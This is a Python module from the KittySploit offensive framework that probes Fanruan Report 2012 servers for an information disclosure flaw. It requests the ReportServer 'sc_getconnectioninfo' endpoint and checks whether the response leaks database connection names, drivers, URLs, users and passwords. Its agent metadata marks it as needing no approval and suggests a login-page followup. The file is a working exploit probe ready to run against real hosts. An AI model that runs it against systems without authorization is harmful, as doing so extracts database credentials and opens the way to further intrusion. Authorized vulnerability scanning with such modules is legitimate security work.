#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fanruan Report 2012 has an information disclosure vulnerability, and some sensitive information can be obtaine."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fanruan Report 2012 Information Disclosure Detection',
        'description': 'Fanruan Report 2012 has an information disclosure vulnerability, and some sensitive information can be obtained by accessing a specific URL',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'oa', 'java', 'fanruan', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%202012%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html',
        ],
    }

    def run(self):
        for path in ('/ReportServer?op=fr_server&cmd=sc_getconnectioninfo', '/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('"connection"', '"name"', '"driver"', '"password"', '"url"', '"user"',)
            header_any = ('application/json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Fanruan Report 2012 Information Disclosure detected",
                    path=path,
                )
                return True
        return False

